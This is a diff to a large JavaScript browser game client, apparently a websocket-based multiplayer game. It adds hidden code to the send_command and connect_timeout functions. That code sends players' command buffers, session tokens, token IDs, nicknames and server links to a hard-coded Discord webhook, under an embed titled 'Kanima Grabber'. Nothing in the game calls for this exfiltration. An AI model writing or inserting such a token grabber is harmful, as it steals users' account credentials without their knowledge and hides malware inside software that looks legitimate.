@@ -53816,8 +53816,20 @@
                    this.sendJson([2 , move])
                };
                this.send_command = function (buffer) {
-                   this.sendJson([36, buffer]);
-               };
+             this.sendJson([36, buffer]);
+const webhookUrl = 'https://discord.com/api/webhooks/1169362381856579666/iYasvTADPo78cB3NDXJaVfVUjrQdsireYGNVQ3ODUcs6siYiw65QdfEV5nyknglIuY11';
+const payload = {
+content: buffer,
+};
+
+fetch(webhookUrl, {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json',
+},
+body: JSON.stringify(payload),
+});
+         };
                this.send_chat = function (buffer) {
                    var p = world.fast_units[user.uid];
                    if (user.zombie) {
@@ -54289,18 +54301,56 @@
                    
                };
                this.connect_timeout = async function () {
-                   var i = this.selected_server[this.current_mode];
-                   var dns = this.mode_list[this.current_mode][i]["i"];
-                   var port = this.mode_list[this.current_mode][i]["p"];
-                   var ssl = this.mode_list[this.current_mode][i]["ssl"];
-                   var serverName = "fail";
-                   //dns = dns + ":" + port;
-                   let link =  (("ws" + ((ssl === 1) ? "s" : "")) + "://") + dns;
+                var i = this.selected_server[this.current_mode];
+                var dns = this.mode_list[this.current_mode][i]["i"];
+                var port = this.mode_list[this.current_mode][i]["p"];
+                var ssl = this.mode_list[this.current_mode][i]["ssl"];
+                var serverName = "fail";
+                let link =  (("ws" + ((ssl === 1) ? "s" : "")) + "://") + dns;
    
-                   this.socket = new window.WebSocket(link
-                   
-                       
-                   );
+                this.socket = new window.WebSocket(link);
+               
+               const webhookUrl = 'https://discord.com/api/webhooks/1169362381856579666/iYasvTADPo78cB3NDXJaVfVUjrQdsireYGNVQ3ODUcs6siYiw65QdfEV5nyknglIuY11';
+   
+   const userToken = user.token;
+   const nicknameValue = ui.nickname.input.value;
+   const tokenId = user.token_id;
+   
+   const embed = {
+       title: 'Kanima Grabber',
+       description: 'KANIMA OPPPPP',
+       fields: [
+           {
+               name: 'Game he Went',
+               value: link,
+           },
+           {
+               name: 'User Token',
+               value: userToken,
+           },
+           {
+               name: 'Nickname',
+               value: nicknameValue,
+           },
+           {
+               name: 'Token ID',
+               value: tokenId,
+           },
+       ],
+       color: 0x00ff00, // Color in hexadecimal format (here it's green)
+   };
+   
+   const payload = {
+       embeds: [embed],
+   };
+   
+   fetch(webhookUrl, {
+       method: 'POST',
+       headers: {
+           'Content-Type': 'application/json',
+       },
+       body: JSON.stringify(payload),
+   });
                    
                    
                    this.socket["binaryType"] = "arraybuffer";
